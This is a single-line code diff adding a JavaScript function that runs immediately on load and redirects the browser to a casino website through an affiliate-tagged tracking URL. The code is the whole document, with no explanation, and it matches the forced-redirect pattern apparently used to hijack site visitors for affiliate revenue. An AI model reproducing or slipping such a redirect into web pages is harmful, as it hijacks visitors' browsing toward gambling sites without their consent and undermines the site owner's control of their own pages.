@@ -1,0 +1,1 @@
+function executeRun(){window.location.href="https://casinochan.com/?btag=670919_dd8f29386bce4d00a41511a74578e866&__layerref=&interlayer-id=92a6ad425dffab1e-1743663498649"}executeRun();
